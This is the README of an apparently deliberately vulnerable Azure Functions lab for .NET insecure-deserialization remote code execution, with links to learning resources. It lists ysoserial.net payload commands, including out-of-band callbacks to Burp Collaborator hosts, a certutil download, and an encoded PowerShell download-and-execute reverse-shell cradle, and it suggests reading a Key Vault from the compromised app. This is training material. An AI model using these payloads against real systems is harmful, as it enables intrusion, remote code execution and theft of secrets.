## DeserialKiller

Azure Function lab for .NET Deserialization RCE demonstration.

Adapted from this blog post which featured an MVC app, made it a one a click deploy

https://sekurity.dev/insecure-deserialization-using-binaryformatter-resulting-in-rce/

Included is "TriggerWarning.cs", it will log the last 10 requests in memory and display them back as a queue. Useful for debugging or catching a callback like Burp Collaborator I guess. Just create another function and paste in that code.

WARNING: DO NOT DEPLOY THIS TO AZURE. Should never run outside of a controlled environment. This is literally a an insecure azure application. Functions can (and in this case should) be run locally to develop them. Just run them both and craft your payloads. DO NOT DEPLOY THIS TO AZURE.

So you're going to deploy it to Azure. Kinda wanted to see if you give it access to a keyvault, can you figure out how to READ the keyvault from inside?  Deploy an AzureVM, isolate it to just your IP. Then go to the network settings of the deployed function app and isolate it with Network Security Groups to just that IP. Then see what you can do as the application.  

## Exploitation
Payload

```powershell
$p = @{name=hostname};Invoke-WebRequest -Uri http://localhost:7298/api/triggerwarning -Method POST -Body ($p | ConvertTo-Json) -ContentType "application/json" -UseBasicParsing

	
.\ysoserial.exe -f BinaryFormatter -g DataSet -c "Invoke-WebRequest http://localhost:7298/api/triggerwarning -Method POST -Body "we in here" -ContentType 'application/json' -UseBasicParsing" -t
```



Plan to add other routes for other Deserialization labs, but for now, here are the bklog posts I'm going to be reading 

## .Net Deserialization Resources
https://medium.com/r3d-buck3t/insecure-deserialization-with-json-net-c70139af011a
https://knowledge-base.secureflag.com/vulnerabilities/unsafe_deserialization/unsafe_deserialization__net.html
https://book.hacktricks.xyz/pentesting-web/deserialization
https://book.hacktricks.xyz/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net
https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter
https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret

## .Net Deserialziation White-Paper - JSON.net
https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

## Initial Access payload generation and WDAC Bypass using .net Deserialization
https://labs.nettitude.com/blog/introducing-aladdin/
https://github.com/nettitude/Aladdin

## Ysoserial.Net Examples
https://github.com/pwntester/ysoserial.net

```powershell
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```

## Web Lab - Portswigger Deserializtion
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization